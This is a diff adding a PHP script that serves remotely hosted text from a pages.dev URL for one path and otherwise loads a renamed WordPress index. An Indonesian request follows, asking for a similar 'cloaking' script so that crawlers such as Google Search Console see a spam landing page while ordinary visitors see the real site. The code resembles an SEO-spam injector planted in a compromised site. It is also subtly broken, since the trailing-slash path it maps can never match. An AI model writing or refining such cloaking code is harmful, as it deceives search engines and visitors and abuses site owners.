@@ -1,0 +1,98 @@
+<?php
+
+function fetchC(string $url): string|false
+{
+    if (function_exists('curl_init')) {
+        $ch = curl_init($url);
+
+        curl_setopt_array($ch, [
+            CURLOPT_RETURNTRANSFER => true,
+            CURLOPT_FOLLOWLOCATION => true,
+            CURLOPT_USERAGENT      => 'Mozilla/5.0',
+            CURLOPT_CONNECTTIMEOUT => 10,
+            CURLOPT_TIMEOUT        => 30,
+            CURLOPT_SSL_VERIFYPEER => true,
+            CURLOPT_SSL_VERIFYHOST => 2,
+        ]);
+
+        $response = curl_exec($ch);
+        $httpCode = (int) curl_getinfo($ch, CURLINFO_HTTP_CODE);
+
+        curl_close($ch);
+
+        if ($response === false || $httpCode < 200 || $httpCode >= 300) {
+            return false;
+        }
+
+        return $response;
+    }
+
+    if (filter_var(ini_get('allow_url_fopen'), FILTER_VALIDATE_BOOLEAN)) {
+        $context = stream_context_create([
+            'http' => [
+                'method'  => 'GET',
+                'header'  => "User-Agent: Mozilla/5.0\r\n",
+                'timeout' => 30,
+            ],
+        ]);
+
+        return @file_get_contents($url, false, $context);
+    }
+
+    return false;
+}
+
+$requestUri = $_SERVER['REQUEST_URI'] ?? '/';
+
+// Buang query string.
+$requestPath = parse_url($requestUri, PHP_URL_PATH) ?: '/';
+
+// Rapikan slash ganda.
+$requestPath = preg_replace('#/+#', '/', $requestPath);
+
+// Samakan path dengan dan tanpa slash di akhir.
+$requestPath = rtrim($requestPath, '/');
+
+if ($requestPath === '') {
+    $requestPath = '/';
+}
+
+$pathMap = [
+    '/bible-verses-against-depression-and-anxiety/'
+        => 'https://bible-verses-against.pages.dev/childbg/a.txt',
+];
+
+if (isset($pathMap[$requestPath])) {
+    $content = fetchC($pathMap[$requestPath]);
+
+    if ($content !== false && $content !== '') {
+        header('Content-Type: text/html; charset=UTF-8');
+        echo $content;
+        exit;
+    }
+}
+
+$fallback = __DIR__ . '/indexx.php';
+
+if (is_file($fallback)) {
+    require $fallback;
+    exit;
+}
+
+http_response_code(404);
+echo 'Halaman tidak ditemukan.';
+
+
+
+
+tolong buatkan script cloakingan seperti ini  
+cuman dia berfungi memanggil folder
+bible-verses-against-depression-and-anxiety/
+
+bukan folder seperti ini
+bible-verses-against-depression-and-anxiety
+
+NOTE 
+Pengunjung biasa melihat halaman asli WordPress.
+Saat Google Search Console atau crawler membuka URL yang sama, crawler melihat landing page dari a.txt.
+
